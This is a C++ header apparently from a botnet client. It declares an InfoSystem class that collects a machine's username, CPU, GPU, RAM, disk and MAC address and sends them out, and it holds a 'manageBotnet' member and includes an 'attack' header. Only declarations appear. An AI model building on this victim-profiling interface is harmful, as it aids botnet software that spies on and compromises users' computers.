#ifndef INFO_H
#define INFO_H

#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include "../attack/attack.h"
#include <Windows.h>
#include <iostream>
#include <format>
#include <string>
#include <pdh.h>
#include <thread>
#include <chrono>
#include <TLHelp32.h>
#include <Psapi.h>
#include <Iphlpapi.h>
#include <nlohmann/json.hpp>
#include <nvml.h>


#pragma comment(lib, "nvml.lib")
#pragma comment(lib, "Iphlpapi.lib")


class InfoSystem {
private:
	nlohmann::json jsonData;
	std::string USERNAME;
	std::string CPU;
	std::string GPU;
	std::string RAM;
	std::string MAC;
	std::vector<std::string> nameHDD;
	std::vector<double> memoryHDD;
	manageBotnet manage;

public:
	InfoSystem();
	void getUserName();
	void getNameCPU();
	void getGPU();
	void getRam();
	void getHDD();
	void getMac();
	void sendData();
};


#endif